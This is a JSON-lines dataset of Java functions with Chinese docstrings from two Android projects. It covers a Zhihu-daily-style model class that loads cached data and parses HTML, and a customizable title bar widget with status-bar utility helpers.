{"docstring": "/**\n * \u53cd\u5e8f\u5217\u5316\u672c\u5730\u6587\u4ef6\u4e3aList\uff0c\u5df2\u8fc7\u65f6\u3002\u5df2\u4f7f\u7528\u6570\u636e\u5e93\u66ff\u4ee3\n *\n * @param date\n * @return\n * @throws IOException\n * @throws ClassNotFoundException\n */\n", "func_signal": "@Deprecated\nprivate List<Daily> deserializDaily(int date) throws IOException, ClassNotFoundException", "code": "{\n    String cachePath = App.getContext().getCacheDir().getAbsolutePath();\n    FileInputStream fis = new FileInputStream(cachePath + \"/daily/\" + date);\n    ObjectInputStream ois = new ObjectInputStream(fis);\n    List<Daily> dailyList = (List<Daily>) ois.readObject();\n    ois.close();\n    return dailyList;\n}", "path": "app\\src\\main\\java\\me\\itangqi\\buildingblocks\\model\\DailyModel.java", "repo_name": "tangqi92/BuildingBlocks", "stars": 845, "license": "gpl-3.0", "language": "java", "size": 24683}
{"docstring": "/**\n * \u5728html+\u6a21\u5f0f\u4e0b\uff0c\u5bf9\u83b7\u53d6\u5230\u7684html\u6570\u636e\u8fdb\u884c\u4fee\u6539\uff0c\u53bb\u9664\u4e0d\u5fc5\u8981\u7684\u6570\u636e\n *\n * @param htmlUrl \u539f\u59cbhtml\u5b57\u7b26\u4e32\n * @return \u4e4b\u540e\u7684html\u6570\u636e\n */\n", "func_signal": "public Map<String, String> parseHtml(String htmlUrl)", "code": "{\n    Map<String, String> htmlMap = new HashMap<>();\n    try {\n        Document document = Jsoup.connect(htmlUrl).userAgent(\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\").get();\n        removeElements(document);\n        Element header = document.select(\"div[class=headline]\").get(0);\n        Elements headerChildren = header.getAllElements();\n        for (Element child : headerChildren) {\n            if (child.className().equals(\"headline-title\")) {\n                String headline_title = child.text();\n                htmlMap.put(\"headline_title\", headline_title);\n            } else if (child.className().equals(\"img-source\")) {\n                String img_source = child.text();\n                htmlMap.put(\"img_source\", img_source);\n            } else if (child.nodeName().equals(\"img\")) {\n                String img = child.attr(\"src\");\n                htmlMap.put(\"img\", img);\n            }\n        }\n        header.remove();\n        Log.d(TAG, \"isLight--->\" + ThemeUtils.isLight);\n        if (!ThemeUtils.isLight) {\n            darkHtml(document);\n        }\n        String content = document.outerHtml();\n        htmlMap.put(\"content\", content);\n    } catch (IOException e) {\n        e.printStackTrace();\n    }\n    return htmlMap;\n}", "path": "app\\src\\main\\java\\me\\itangqi\\buildingblocks\\model\\DailyModel.java", "repo_name": "tangqi92/BuildingBlocks", "stars": 845, "license": "gpl-3.0", "language": "java", "size": 24683}
{"docstring": "/**\n * \u521d\u59cb\u5316\u4e3b\u89c6\u56fe\u53f3\u8fb9\u90e8\u5206\n * -- add: adaptive RTL\n * @param context       \u4e0a\u4e0b\u6587\n */\n", "func_signal": "private void initMainRightViews(Context context)", "code": "{\n    LayoutParams rightInnerParams = new LayoutParams(WRAP_CONTENT, MATCH_PARENT);\n    rightInnerParams.addRule(RelativeLayout.ALIGN_PARENT_END);\n    rightInnerParams.addRule(RelativeLayout.CENTER_VERTICAL);\n\n    if (rightType == TYPE_RIGHT_TEXTVIEW) {\n        // \u521d\u59cb\u5316\u53f3\u8fb9TextView\n        tvRight = new TextView(context);\n        tvRight.setId(StatusBarUtils.generateViewId());\n        tvRight.setText(rightText);\n        tvRight.setTextColor(rightTextColor);\n        tvRight.setTextSize(TypedValue.COMPLEX_UNIT_PX, rightTextSize);\n        tvRight.setGravity(Gravity.END | Gravity.CENTER_VERTICAL);\n        tvRight.setSingleLine(true);\n        tvRight.setPadding(PADDING_12, 0, PADDING_12, 0);\n        tvRight.setOnClickListener(this);\n        rlMain.addView(tvRight, rightInnerParams);\n\n    } else if (rightType == TYPE_RIGHT_IMAGEBUTTON) {\n        // \u521d\u59cb\u5316\u53f3\u8fb9ImageBtn\n        btnRight = new ImageButton(context);\n        btnRight.setId(StatusBarUtils.generateViewId());\n        btnRight.setImageResource(rightImageResource);\n        btnRight.setBackgroundColor(Color.TRANSPARENT);\n        btnRight.setScaleType(ImageView.ScaleType.CENTER_INSIDE);\n        btnRight.setPadding(PADDING_12, 0, PADDING_12, 0);\n        btnRight.setOnClickListener(this);\n        rlMain.addView(btnRight, rightInnerParams);\n\n    } else if (rightType == TYPE_RIGHT_CUSTOM_VIEW) {\n        // \u521d\u59cb\u5316\u81ea\u5b9a\u4e49view\n        viewCustomRight = LayoutInflater.from(context).inflate(rightCustomViewRes, rlMain, false);\n        if (viewCustomRight.getId() == View.NO_ID) {\n            viewCustomRight.setId(StatusBarUtils.generateViewId());\n        }\n        rlMain.addView(viewCustomRight, rightInnerParams);\n    }\n}", "path": "library\\src\\main\\java\\com\\wuhenzhizao\\titlebar\\widget\\CommonTitleBar.java", "repo_name": "wuhenzhizao/android-titlebar", "stars": 956, "license": "None", "language": "java", "size": 7228}
{"docstring": "/**\n * \u8bbe\u7f6e\u72b6\u6001\u680f\u989c\u8272\n *\n * @param color\n */\n", "func_signal": "public void setStatusBarColor(int color)", "code": "{\n    if (viewStatusBarFill != null) {\n        viewStatusBarFill.setBackgroundColor(color);\n    }\n}", "path": "library\\src\\main\\java\\com\\wuhenzhizao\\titlebar\\widget\\CommonTitleBar.java", "repo_name": "wuhenzhizao/android-titlebar", "stars": 956, "license": "None", "language": "java", "size": 7228}
{"docstring": "/**\n * @param rightView\n */\n", "func_signal": "public void setRightView(View rightView)", "code": "{\n    if (rightView.getId() == View.NO_ID) {\n        rightView.setId(StatusBarUtils.generateViewId());\n    }\n    LayoutParams rightInnerParams = new LayoutParams(WRAP_CONTENT, MATCH_PARENT);\n    rightInnerParams.addRule(RelativeLayout.ALIGN_PARENT_END);\n    rightInnerParams.addRule(RelativeLayout.CENTER_VERTICAL);\n    rlMain.addView(rightView, rightInnerParams);\n}", "path": "library\\src\\main\\java\\com\\wuhenzhizao\\titlebar\\widget\\CommonTitleBar.java", "repo_name": "wuhenzhizao/android-titlebar", "stars": 956, "license": "None", "language": "java", "size": 7228}
{"docstring": "/**\n * \u8ba1\u7b97\u72b6\u6001\u680f\u989c\u8272\n *\n * @param color color\u503c\n * @param alpha alpha\u503c\n * @return \u6700\u7ec8\u7684\u72b6\u6001\u680f\u989c\u8272\n */\n", "func_signal": "private static int calculateStatusColor(@ColorInt int color, int alpha)", "code": "{\n    if (alpha == 0) {\n        return color;\n    }\n    float a = 1 - alpha / 255f;\n    int red = color >> 16 & 0xff;\n    int green = color >> 8 & 0xff;\n    int blue = color & 0xff;\n    red = (int) (red * a + 0.5);\n    green = (int) (green * a + 0.5);\n    blue = (int) (blue * a + 0.5);\n    return 0xff << 24 | red << 16 | green << 8 | blue;\n}", "path": "library\\src\\main\\java\\com\\wuhenzhizao\\titlebar\\statusbar\\StatusBarUtils.java", "repo_name": "wuhenzhizao/android-titlebar", "stars": 956, "license": "None", "language": "java", "size": 7228}
{"docstring": "/**\n * \u8ba1\u7b97View Id\n *\n * @return\n */\n", "func_signal": "public static int generateViewId()", "code": "{\n    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {\n        return View.generateViewId();\n    } else {\n        return UUID.randomUUID().hashCode();\n    }\n}", "path": "library\\src\\main\\java\\com\\wuhenzhizao\\titlebar\\statusbar\\StatusBarUtils.java", "repo_name": "wuhenzhizao/android-titlebar", "stars": 956, "license": "None", "language": "java", "size": 7228}
{"docstring": "/**\n * \u521d\u59cb\u5316\u5168\u5c40\u89c6\u56fe\n *\n * @param context       \u4e0a\u4e0b\u6587\n */\n", "func_signal": "private void initGlobalViews(Context context)", "code": "{\n    ViewGroup.LayoutParams globalParams = new ViewGroup.LayoutParams(MATCH_PARENT, WRAP_CONTENT);\n    setLayoutParams(globalParams);\n\n    boolean transparentStatusBar = StatusBarUtils.supportTransparentStatusBar();\n\n    // \u6784\u5efa\u6807\u9898\u680f\u586b\u5145\u89c6\u56fe\n    if (fillStatusBar && transparentStatusBar) {\n        int statusBarHeight = StatusBarUtils.getStatusBarHeight(context);\n        viewStatusBarFill = new View(context);\n        viewStatusBarFill.setId(StatusBarUtils.generateViewId());\n        viewStatusBarFill.setBackgroundColor(statusBarColor);\n        LayoutParams statusBarParams = new LayoutParams(MATCH_PARENT, statusBarHeight);\n        statusBarParams.addRule(RelativeLayout.ALIGN_PARENT_TOP);\n        addView(viewStatusBarFill, statusBarParams);\n    }\n\n    // \u6784\u5efa\u4e3b\u89c6\u56fe\n    rlMain = new RelativeLayout(context);\n    rlMain.setId(StatusBarUtils.generateViewId());\n    rlMain.setBackgroundColor(titleBarColor);\n    LayoutParams mainParams = new LayoutParams(MATCH_PARENT, titleBarHeight);\n    if (fillStatusBar && transparentStatusBar) {\n        mainParams.addRule(RelativeLayout.BELOW, viewStatusBarFill.getId());\n    } else {\n        mainParams.addRule(RelativeLayout.ALIGN_PARENT_TOP);\n    }\n\n    // \u8ba1\u7b97\u4e3b\u5e03\u5c40\u9ad8\u5ea6\n    if (showBottomLine) {\n        mainParams.height = titleBarHeight - Math.max(1, ScreenUtils.dp2PxInt(context, 0.4f));\n    } else {\n        mainParams.height = titleBarHeight;\n    }\n    addView(rlMain, mainParams);\n\n    // \u6784\u5efa\u5206\u5272\u7ebf\u89c6\u56fe\n    if (showBottomLine) {\n        // \u5df2\u8bbe\u7f6e\u663e\u793a\u6807\u9898\u680f\u5206\u9694\u7ebf,5.0\u4ee5\u4e0b\u673a\u578b,\u663e\u793a\u5206\u9694\u7ebf\n        viewBottomLine = new View(context);\n        viewBottomLine.setBackgroundColor(bottomLineColor);\n        LayoutParams bottomLineParams = new LayoutParams(MATCH_PARENT, Math.max(1, ScreenUtils.dp2PxInt(context, 0.4f)));\n        bottomLineParams.addRule(RelativeLayout.BELOW, rlMain.getId());\n\n        addView(viewBottomLine, bottomLineParams);\n    } else if (bottomShadowHeight != 0) {\n        viewBottomShadow = new View(context);\n        viewBottomShadow.setBackgroundResource(R.drawable.comm_titlebar_bottom_shadow);\n        LayoutParams bottomShadowParams = new LayoutParams(MATCH_PARENT, ScreenUtils.dp2PxInt(context, bottomShadowHeight));\n        bottomShadowParams.addRule(RelativeLayout.BELOW, rlMain.getId());\n\n        addView(viewBottomShadow, bottomShadowParams);\n    }\n}", "path": "library\\src\\main\\java\\com\\wuhenzhizao\\titlebar\\widget\\CommonTitleBar.java", "repo_name": "wuhenzhizao/android-titlebar", "stars": 956, "license": "None", "language": "java", "size": 7228}
{"docstring": "/**\n * \u521d\u59cb\u5316\u4e3b\u89c6\u56fe\u4e2d\u95f4\u90e8\u5206\n *\n * @param context   \u4e0a\u4e0b\u6587\n */\n", "func_signal": "private void initMainCenterViews(Context context)", "code": "{\n    if (centerType == TYPE_CENTER_TEXTVIEW) {\n        // \u521d\u59cb\u5316\u4e2d\u95f4\u5b50\u5e03\u5c40\n        llMainCenter = new LinearLayout(context);\n        llMainCenter.setId(StatusBarUtils.generateViewId());\n        llMainCenter.setGravity(Gravity.CENTER);\n        llMainCenter.setOrientation(LinearLayout.VERTICAL);\n        llMainCenter.setOnClickListener(this);\n\n        LayoutParams centerParams = new LayoutParams(WRAP_CONTENT, MATCH_PARENT);\n        centerParams.setMarginStart(PADDING_12);\n        centerParams.setMarginEnd(PADDING_12);\n        centerParams.addRule(RelativeLayout.CENTER_IN_PARENT);\n        rlMain.addView(llMainCenter, centerParams);\n\n        // \u521d\u59cb\u5316\u6807\u9898\u680fTextView\n        tvCenter = new TextView(context);\n        tvCenter.setText(centerText);\n        tvCenter.setTextColor(centerTextColor);\n        tvCenter.setTextSize(TypedValue.COMPLEX_UNIT_PX, centerTextSize);\n        tvCenter.setGravity(Gravity.CENTER);\n        tvCenter.setSingleLine(true);\n        // \u8bbe\u7f6e\u8dd1\u9a6c\u706f\u6548\u679c\n        tvCenter.setMaxWidth((int) (ScreenUtils.getScreenPixelSize(context)[0] * 3 / 5.0));\n        if (centerTextMarquee){\n            tvCenter.setEllipsize(TextUtils.TruncateAt.MARQUEE);\n            tvCenter.setMarqueeRepeatLimit(-1);\n            tvCenter.requestFocus();\n            tvCenter.setSelected(true);\n        }\n\n        LinearLayout.LayoutParams centerTextParams = new LinearLayout.LayoutParams(WRAP_CONTENT, WRAP_CONTENT);\n        llMainCenter.addView(tvCenter, centerTextParams);\n\n        // \u521d\u59cb\u5316\u8fdb\u5ea6\u6761, \u663e\u793a\u4e8e\u6807\u9898\u680f\u5de6\u8fb9\n        progressCenter = new ProgressBar(context);\n        progressCenter.setIndeterminateDrawable(getResources().getDrawable(R.drawable.comm_titlebar_progress_draw));\n        progressCenter.setVisibility(View.GONE);\n        int progressWidth = ScreenUtils.dp2PxInt(context, 18);\n        LayoutParams progressParams = new LayoutParams(progressWidth, progressWidth);\n        progressParams.addRule(RelativeLayout.CENTER_VERTICAL);\n        progressParams.addRule(RelativeLayout.START_OF, llMainCenter.getId());\n        rlMain.addView(progressCenter, progressParams);\n\n        // \u521d\u59cb\u5316\u526f\u6807\u9898\u680f\n        tvCenterSub = new TextView(context);\n        tvCenterSub.setText(centerSubText);\n        tvCenterSub.setTextColor(centerSubTextColor);\n        tvCenterSub.setTextSize(TypedValue.COMPLEX_UNIT_PX, centerSubTextSize);\n        tvCenterSub.setGravity(Gravity.CENTER);\n        tvCenterSub.setSingleLine(true);\n        if (TextUtils.isEmpty(centerSubText)) {\n            tvCenterSub.setVisibility(View.GONE);\n        }\n\n        LinearLayout.LayoutParams centerSubTextParams = new LinearLayout.LayoutParams(WRAP_CONTENT, WRAP_CONTENT);\n        llMainCenter.addView(tvCenterSub, centerSubTextParams);\n    } else if (centerType == TYPE_CENTER_SEARCHVIEW) {\n        // \u521d\u59cb\u5316\u901a\u7528\u641c\u7d22\u6846\n        rlMainCenterSearch = new RelativeLayout(context);\n        rlMainCenterSearch.setBackgroundResource(centerSearchBgResource);\n        LayoutParams centerParams = new LayoutParams(MATCH_PARENT, MATCH_PARENT);\n        // \u8bbe\u7f6e\u8fb9\u8ddd\n        centerParams.topMargin = ScreenUtils.dp2PxInt(context, 7);\n        centerParams.bottomMargin = ScreenUtils.dp2PxInt(context, 7);\n        // \u6839\u636e\u5de6\u8fb9\u7684\u5e03\u5c40\u7c7b\u578b\u6765\u8bbe\u7f6e\u8fb9\u8ddd,\u5e03\u5c40\u4f9d\u8d56\u89c4\u5219\n        if (leftType == TYPE_LEFT_TEXTVIEW) {\n            centerParams.addRule(RelativeLayout.END_OF, tvLeft.getId());\n            centerParams.setMarginStart(PADDING_5);\n        } else if (leftType == TYPE_LEFT_IMAGEBUTTON) {\n            centerParams.addRule(RelativeLayout.END_OF, btnLeft.getId());\n            centerParams.setMarginStart(PADDING_5);\n        } else if (leftType == TYPE_LEFT_CUSTOM_VIEW) {\n            centerParams.addRule(RelativeLayout.END_OF, viewCustomLeft.getId());\n            centerParams.setMarginStart(PADDING_5);\n        } else {\n            centerParams.setMarginStart(PADDING_12);\n        }\n        // \u6839\u636e\u53f3\u8fb9\u7684\u5e03\u5c40\u7c7b\u578b\u6765\u8bbe\u7f6e\u8fb9\u8ddd,\u5e03\u5c40\u4f9d\u8d56\u89c4\u5219\n        if (rightType == TYPE_RIGHT_TEXTVIEW) {\n            centerParams.addRule(RelativeLayout.START_OF, tvRight.getId());\n            centerParams.setMarginEnd(PADDING_5);\n        } else if (rightType == TYPE_RIGHT_IMAGEBUTTON) {\n            centerParams.addRule(RelativeLayout.START_OF, btnRight.getId());\n            centerParams.setMarginEnd(PADDING_5);\n        } else if (rightType == TYPE_RIGHT_CUSTOM_VIEW) {\n            centerParams.addRule(RelativeLayout.START_OF, viewCustomRight.getId());\n            centerParams.setMarginEnd(PADDING_5);\n        } else {\n            centerParams.setMarginEnd(PADDING_12);\n        }\n        rlMain.addView(rlMainCenterSearch, centerParams);\n\n        // \u521d\u59cb\u5316\u641c\u7d22\u6846\u641c\u7d22ImageView\n        ivSearch = new ImageView(context);\n        ivSearch.setId(StatusBarUtils.generateViewId());\n        ivSearch.setOnClickListener(this);\n        int searchIconWidth = ScreenUtils.dp2PxInt(context, 15);\n        LayoutParams searchParams = new LayoutParams(searchIconWidth, searchIconWidth);\n        searchParams.addRule(RelativeLayout.CENTER_VERTICAL);\n        searchParams.addRule(RelativeLayout.ALIGN_PARENT_START);\n        searchParams.setMarginStart(PADDING_12);\n        rlMainCenterSearch.addView(ivSearch, searchParams);\n        ivSearch.setImageResource(R.drawable.comm_titlebar_search_normal);\n\n        // \u521d\u59cb\u5316\u641c\u7d22\u6846\u8bed\u97f3ImageView\n        ivVoice = new ImageView(context);\n        ivVoice.setId(StatusBarUtils.generateViewId());\n        ivVoice.setOnClickListener(this);\n        LayoutParams voiceParams = new LayoutParams(WRAP_CONTENT, WRAP_CONTENT);\n        voiceParams.addRule(RelativeLayout.CENTER_VERTICAL);\n        voiceParams.addRule(RelativeLayout.ALIGN_PARENT_END);\n        voiceParams.setMarginEnd(PADDING_12);\n        rlMainCenterSearch.addView(ivVoice, voiceParams);\n        if (centerSearchRightType == TYPE_CENTER_SEARCH_RIGHT_VOICE) {\n            ivVoice.setImageResource(R.drawable.comm_titlebar_voice);\n        } else {\n            ivVoice.setImageResource(R.drawable.comm_titlebar_delete_normal);\n            ivVoice.setVisibility(View.GONE);\n        }\n\n        // \u521d\u59cb\u5316\u6587\u5b57\u8f93\u5165\u6846\n        etSearchHint = new EditText(context);\n        etSearchHint.setBackgroundColor(Color.TRANSPARENT);\n        etSearchHint.setGravity(Gravity.START | Gravity.CENTER_VERTICAL);\n        etSearchHint.setHint(getResources().getString(R.string.titlebar_search_hint));\n        etSearchHint.setTextColor(Color.parseColor(\"#666666\"));\n        etSearchHint.setHintTextColor(Color.parseColor(\"#999999\"));\n        etSearchHint.setTextSize(TypedValue.COMPLEX_UNIT_PX, ScreenUtils.dp2PxInt(context, 14));\n        etSearchHint.setPadding(PADDING_5, 0, PADDING_5, 0);\n        if (!centerSearchEditable) {\n            etSearchHint.setCursorVisible(false);\n            etSearchHint.clearFocus();\n            etSearchHint.setFocusable(false);\n            etSearchHint.setOnClickListener(this);\n        } else {\n            etSearchHint.setOnClickListener(new OnClickListener() {\n                @Override\n                public void onClick(View v) {\n                    etSearchHint.setCursorVisible(true);\n                }\n            });\n        }\n        etSearchHint.setCursorVisible(false);\n        etSearchHint.setSingleLine(true);\n        etSearchHint.setEllipsize(TextUtils.TruncateAt.END);\n        etSearchHint.setImeOptions(EditorInfo.IME_ACTION_SEARCH);\n        etSearchHint.addTextChangedListener(centerSearchWatcher);\n        etSearchHint.setOnFocusChangeListener(focusChangeListener);\n        etSearchHint.setOnEditorActionListener(editorActionListener);\n        LayoutParams searchHintParams = new LayoutParams(MATCH_PARENT, MATCH_PARENT);\n        searchHintParams.addRule(RelativeLayout.END_OF, ivSearch.getId());\n        searchHintParams.addRule(RelativeLayout.START_OF, ivVoice.getId());\n        searchHintParams.addRule(RelativeLayout.CENTER_VERTICAL);\n        searchHintParams.setMarginStart(PADDING_5);\n        searchHintParams.setMarginEnd(PADDING_5);\n        rlMainCenterSearch.addView(etSearchHint, searchHintParams);\n\n    } else if (centerType == TYPE_CENTER_CUSTOM_VIEW) {\n        // \u521d\u59cb\u5316\u4e2d\u95f4\u81ea\u5b9a\u4e49\u5e03\u5c40\n        centerCustomView = LayoutInflater.from(context).inflate(centerCustomViewRes, rlMain, false);\n        if (centerCustomView.getId() == View.NO_ID) {\n            centerCustomView.setId(StatusBarUtils.generateViewId());\n        }\n        LayoutParams centerCustomParams = new LayoutParams(WRAP_CONTENT, MATCH_PARENT);\n        centerCustomParams.setMarginStart(PADDING_12);\n        centerCustomParams.setMarginEnd(PADDING_12);\n        centerCustomParams.addRule(RelativeLayout.CENTER_IN_PARENT);\n//            if (leftType == TYPE_LEFT_TEXTVIEW) {\n//                centerCustomParams.addRule(RelativeLayout.END_OF, tvLeft.getId());\n//            } else if (leftType == TYPE_LEFT_IMAGEBUTTON) {\n//                centerCustomParams.addRule(RelativeLayout.END_OF, btnLeft.getId());\n//            } else if (leftType == TYPE_LEFT_CUSTOM_VIEW) {\n//                centerCustomParams.addRule(RelativeLayout.END_OF, viewCustomLeft.getId());\n//            }\n//            if (rightType == TYPE_RIGHT_TEXTVIEW) {\n//                centerCustomParams.addRule(RelativeLayout.START_OF, tvRight.getId());\n//            } else if (rightType == TYPE_RIGHT_IMAGEBUTTON) {\n//                centerCustomParams.addRule(RelativeLayout.START_OF, btnRight.getId());\n//            } else if (rightType == TYPE_RIGHT_CUSTOM_VIEW) {\n//                centerCustomParams.addRule(RelativeLayout.START_OF, viewCustomRight.getId());\n//            }\n        rlMain.addView(centerCustomView, centerCustomParams);\n    }\n}", "path": "library\\src\\main\\java\\com\\wuhenzhizao\\titlebar\\widget\\CommonTitleBar.java", "repo_name": "wuhenzhizao/android-titlebar", "stars": 956, "license": "None", "language": "java", "size": 7228}
{"docstring": "/**\n * \u83b7\u53d6SearchView\u8f93\u5165\u7ed3\u679c\n */\n", "func_signal": "public String getSearchKey()", "code": "{\n    if (etSearchHint != null) {\n        return etSearchHint.getText().toString();\n    }\n    return \"\";\n}", "path": "library\\src\\main\\java\\com\\wuhenzhizao\\titlebar\\widget\\CommonTitleBar.java", "repo_name": "wuhenzhizao/android-titlebar", "stars": 956, "license": "None", "language": "java", "size": 7228}
{"docstring": "/**\n * \u8bbe\u7f6e\u72b6\u6001\u680f\u56fe\u6807\u767d\u8272\u4e3b\u9898\n *\n * @param window\n */\n", "func_signal": "public static void setLightMode(Window window)", "code": "{\n    if (OSUtils.isMiui()) {\n        setMIUIStatusBarDarkMode(window, false);\n    } else if (OSUtils.isFlyme()) {\n        setFlymeStatusBarDarkMode(window, false);\n    } else if (OSUtils.isOppo()) {\n        setOppoStatusBarDarkMode(window, false);\n    } else {\n        setStatusBarDarkMode(window, false);\n    }\n}", "path": "library\\src\\main\\java\\com\\wuhenzhizao\\titlebar\\statusbar\\StatusBarUtils.java", "repo_name": "wuhenzhizao/android-titlebar", "stars": 956, "license": "None", "language": "java", "size": 7228}
{"docstring": "/**\n * \u521d\u59cb\u5316\u4e3b\u89c6\u56fe\u5de6\u8fb9\u90e8\u5206\n * -- add: adaptive RTL\n * @param context       \u4e0a\u4e0b\u6587\n */\n", "func_signal": "private void initMainLeftViews(Context context)", "code": "{\n    LayoutParams leftInnerParams = new LayoutParams(WRAP_CONTENT, MATCH_PARENT);\n    leftInnerParams.addRule(RelativeLayout.ALIGN_PARENT_START);\n    leftInnerParams.addRule(RelativeLayout.CENTER_VERTICAL);\n\n    if (leftType == TYPE_LEFT_TEXTVIEW) {\n        // \u521d\u59cb\u5316\u5de6\u8fb9TextView\n        tvLeft = new TextView(context);\n        tvLeft.setId(StatusBarUtils.generateViewId());\n        tvLeft.setText(leftText);\n        tvLeft.setTextColor(leftTextColor);\n        tvLeft.setTextSize(TypedValue.COMPLEX_UNIT_PX, leftTextSize);\n        tvLeft.setGravity(Gravity.START | Gravity.CENTER_VERTICAL);\n        tvLeft.setSingleLine(true);\n        tvLeft.setOnClickListener(this);\n        // \u8bbe\u7f6eDrawableLeft\u53caDrawablePadding\n        if (leftDrawable != 0) {\n            tvLeft.setCompoundDrawablePadding((int) leftDrawablePadding);\n            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {\n                tvLeft.setCompoundDrawablesRelativeWithIntrinsicBounds(leftDrawable, 0, 0, 0);\n            } else {\n                tvLeft.setCompoundDrawablesWithIntrinsicBounds(leftDrawable, 0, 0, 0);\n            }\n        }\n        tvLeft.setPadding(PADDING_12, 0, PADDING_12, 0);\n\n        rlMain.addView(tvLeft, leftInnerParams);\n\n    } else if (leftType == TYPE_LEFT_IMAGEBUTTON) {\n        // \u521d\u59cb\u5316\u5de6\u8fb9ImageButton\n        btnLeft = new ImageButton(context);\n        btnLeft.setId(StatusBarUtils.generateViewId());\n        btnLeft.setBackgroundColor(Color.TRANSPARENT);\n        btnLeft.setImageResource(leftImageResource);\n        btnLeft.setPadding(PADDING_12, 0, PADDING_12, 0);\n        btnLeft.setOnClickListener(this);\n\n        rlMain.addView(btnLeft, leftInnerParams);\n\n    } else if (leftType == TYPE_LEFT_CUSTOM_VIEW) {\n        // \u521d\u59cb\u5316\u81ea\u5b9a\u4e49View\n        viewCustomLeft = LayoutInflater.from(context).inflate(leftCustomViewRes, rlMain, false);\n        if (viewCustomLeft.getId() == View.NO_ID) {\n            viewCustomLeft.setId(StatusBarUtils.generateViewId());\n        }\n        rlMain.addView(viewCustomLeft, leftInnerParams);\n    }\n}", "path": "library\\src\\main\\java\\com\\wuhenzhizao\\titlebar\\widget\\CommonTitleBar.java", "repo_name": "wuhenzhizao/android-titlebar", "stars": 956, "license": "None", "language": "java", "size": 7228}
{"docstring": "/**\n * @param leftView\n */\n", "func_signal": "public void setLeftView(View leftView)", "code": "{\n    if (leftView.getId() == View.NO_ID) {\n        leftView.setId(StatusBarUtils.generateViewId());\n    }\n    LayoutParams leftInnerParams = new LayoutParams(WRAP_CONTENT, MATCH_PARENT);\n    leftInnerParams.addRule(RelativeLayout.ALIGN_PARENT_START);\n    leftInnerParams.addRule(RelativeLayout.CENTER_VERTICAL);\n    rlMain.addView(leftView, leftInnerParams);\n}", "path": "library\\src\\main\\java\\com\\wuhenzhizao\\titlebar\\widget\\CommonTitleBar.java", "repo_name": "wuhenzhizao/android-titlebar", "stars": 956, "license": "None", "language": "java", "size": 7228}
{"docstring": "/**\n * \u8bbe\u7f6e\u80cc\u666f\u56fe\u7247\n *\n * @param resource\n */\n", "func_signal": "@Override\npublic void setBackgroundResource(int resource)", "code": "{\n    setBackgroundColor(Color.TRANSPARENT);\n    super.setBackgroundResource(resource);\n}", "path": "library\\src\\main\\java\\com\\wuhenzhizao\\titlebar\\widget\\CommonTitleBar.java", "repo_name": "wuhenzhizao/android-titlebar", "stars": 956, "license": "None", "language": "java", "size": 7228}
{"docstring": "/**\n * \u521d\u59cb\u5316\u4e3b\u89c6\u56fe\n *\n * @param context       \u4e0a\u4e0b\u6587\n */\n", "func_signal": "private void initMainViews(Context context)", "code": "{\n    if (leftType != TYPE_LEFT_NONE) {\n        initMainLeftViews(context);\n    }\n    if (rightType != TYPE_RIGHT_NONE) {\n        initMainRightViews(context);\n    }\n    if (centerType != TYPE_CENTER_NONE) {\n        initMainCenterViews(context);\n    }\n}", "path": "library\\src\\main\\java\\com\\wuhenzhizao\\titlebar\\widget\\CommonTitleBar.java", "repo_name": "wuhenzhizao/android-titlebar", "stars": 956, "license": "None", "language": "java", "size": 7228}
{"docstring": "/**\n * \u8bbe\u7f6e\u80cc\u666f\u989c\u8272\n *\n * @param color\n */\n", "func_signal": "@Override\npublic void setBackgroundColor(int color)", "code": "{\n    if (viewStatusBarFill != null) {\n        viewStatusBarFill.setBackgroundColor(color);\n    }\n    rlMain.setBackgroundColor(color);\n}", "path": "library\\src\\main\\java\\com\\wuhenzhizao\\titlebar\\widget\\CommonTitleBar.java", "repo_name": "wuhenzhizao/android-titlebar", "stars": 956, "license": "None", "language": "java", "size": 7228}
{"docstring": "/**\n * \u8bbe\u7f6e\u641c\u7d22\u6846\u53f3\u8fb9\u56fe\u6807\n *\n * @param res\n */\n", "func_signal": "public void setSearchRightImageResource(int res)", "code": "{\n    if (ivVoice != null) {\n        ivVoice.setImageResource(res);\n    }\n}", "path": "library\\src\\main\\java\\com\\wuhenzhizao\\titlebar\\widget\\CommonTitleBar.java", "repo_name": "wuhenzhizao/android-titlebar", "stars": 956, "license": "None", "language": "java", "size": 7228}
{"docstring": "/**\n * @param centerView\n */\n", "func_signal": "public void setCenterView(View centerView)", "code": "{\n    if (centerView.getId() == View.NO_ID) {\n        centerView.setId(StatusBarUtils.generateViewId());\n    }\n    LayoutParams centerInnerParams = new LayoutParams(WRAP_CONTENT, MATCH_PARENT);\n    centerInnerParams.addRule(RelativeLayout.CENTER_IN_PARENT);\n    centerInnerParams.addRule(RelativeLayout.CENTER_VERTICAL);\n    rlMain.addView(centerView, centerInnerParams);\n}", "path": "library\\src\\main\\java\\com\\wuhenzhizao\\titlebar\\widget\\CommonTitleBar.java", "repo_name": "wuhenzhizao/android-titlebar", "stars": 956, "license": "None", "language": "java", "size": 7228}
{"docstring": "/**\n * \u68c0\u6d4b\u662f\u5426\u6709\u865a\u62df\u5bfc\u822a\u680f\n *\n * @param context\n * @return\n */\n", "func_signal": "public static boolean checkDeviceHasNavigationBar(Context context)", "code": "{\n    boolean hasNavigationBar = false;\n    Resources rs = context.getResources();\n    int id = rs.getIdentifier(\"config_showNavigationBar\", \"bool\", \"android\");\n    if (id > 0) {\n        hasNavigationBar = rs.getBoolean(id);\n    }\n    try {\n        Class systemPropertiesClass = Class.forName(\"android.os.SystemProperties\");\n        Method m = systemPropertiesClass.getMethod(\"get\", String.class);\n        String navBarOverride = (String) m.invoke(systemPropertiesClass, \"qemu.hw.mainkeys\");\n        if (\"1\".equals(navBarOverride)) {\n            hasNavigationBar = false;\n        } else if (\"0\".equals(navBarOverride)) {\n            hasNavigationBar = true;\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n    return hasNavigationBar;\n}", "path": "library\\src\\main\\java\\com\\wuhenzhizao\\titlebar\\statusbar\\StatusBarUtils.java", "repo_name": "wuhenzhizao/android-titlebar", "stars": 956, "license": "None", "language": "java", "size": 7228}
